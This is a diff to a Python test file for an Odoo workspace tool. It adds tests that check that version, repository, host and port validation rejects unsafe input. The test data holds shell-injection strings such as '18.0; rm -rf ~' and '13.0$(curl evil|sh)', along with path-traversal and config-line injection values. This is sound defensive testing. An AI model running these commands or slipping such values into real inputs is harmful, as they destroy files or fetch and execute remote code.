@@ -56,12 +56,11 @@ def test_workspace_port_offsets_are_deterministic():
     assert cfg.http_port_for("19.0") == 8089
 
 
-def test_normalize_defaults_fills_user_and_prefix():
+def test_normalize_defaults_fills_the_db_user():
     cfg = WorkspaceConfig(name="acme")
     cfg.normalize_defaults()
     # The shared development role, the one `provision apply` creates by default.
     assert cfg.db_user == DEFAULT_DB_ROLE == "odoo"
-    assert cfg.addon_prefix == "acme"
 
 
 def test_normalize_defaults_keeps_an_explicit_db_user():
@@ -150,3 +149,65 @@ def test_save_and_load_round_trip(tmp_path):
     assert restored.versions == ["17.0", "18.0"]
     assert restored.oca_repos == ["web"]
     assert restored.db_user == "odoo"
+
+
+
+# --- validation of everything that reaches paths, scripts and odoo.conf -------
+
+import pytest as _pytest  # noqa: E402
+
+from odoo_dwg.models import MigrationEnv as _MigrationEnv  # noqa: E402
+
+INJECTIONS = ["18.0$(touch /tmp/p)", "18.0\nadmin_passwd = x", "18.0`id`", "18.0; rm -rf ~"]
+
+
+@_pytest.mark.parametrize("version", INJECTIONS + ["18", "20.0", "11.0", "", 18.0, None])
+def test_workspace_rejects_anything_but_a_supported_version(version):
+    cfg = WorkspaceConfig(name="acme", versions=[version])
+    cfg.normalize_defaults()  # never raises on a bad value
+    with _pytest.raises(ValueError, match="[Ii]nvalid Odoo version"):
+        cfg.validate()
+
+
+@_pytest.mark.parametrize("source,target", [("13.0$(curl evil|sh)", "15.0"),
+                                            ("13", "15.0"), ("13.0", "15.0`id`")])
+def test_migration_rejects_anything_but_chain_versions(source, target):
+    with _pytest.raises(ValueError, match="[Ii]nvalid Odoo version"):
+        _MigrationEnv(source=source, target=target).validate()
+
+
+@_pytest.mark.parametrize("field,value,message", [
+    ("oca_repos", ["../../etc"], "[Ii]nvalid OCA repository name"),
+    ("oca_repos", ["web/../x"], "[Ii]nvalid OCA repository name"),
+    ("oca_repos", ["web$(id)"], "[Ii]nvalid OCA repository name"),
+    ("oca_repos", "web", "oca_repos must be a list"),
+    ("db_host", "127.0.0.1\nadmin_passwd = x", "[Ii]nvalid db_host"),
+    ("db_host", "$(id)", "[Ii]nvalid db_host"),
+    ("db_port", "5432", "[Ii]nvalid db_port"),
+    ("db_port", 70000, "[Ii]nvalid db_port"),
+    ("http_port_base", True, "[Ii]nvalid http_port_base"),
+    ("name", 7, "[Ii]nvalid workspace name"),
+    ("db_user", ["odoo"], "[Ii]nvalid db_user"),
+])
+def test_workspace_rejects_unsafe_profile_values(field, value, message):
+    cfg = WorkspaceConfig(name="acme", versions=["18.0"])
+    cfg.normalize_defaults()
+    setattr(cfg, field, value)
+    with _pytest.raises(ValueError, match=message):
+        cfg.validate()
+
+
+def test_valid_profile_values_still_pass():
+    cfg = WorkspaceConfig(name="acme", versions=["19.0", "12.0"], oca_repos=["web", "server-tools",
+                          "l10n-spain"], db_host="db.internal.example", db_port=5433)
+    cfg.normalize_defaults()
+    cfg.validate()
+    assert cfg.versions == ["12.0", "19.0"]
+    for host in ("127.0.0.1", "::1", "localhost"):
+        cfg.db_host = host
+        cfg.validate()
+
+
+def test_the_chain_is_every_supported_version():
+    from odoo_dwg.models import MIGRATION_CHAIN, ODOO_SUPPORT
+    assert MIGRATION_CHAIN == tuple(f"{major}.0" for major in sorted(ODOO_SUPPORT))
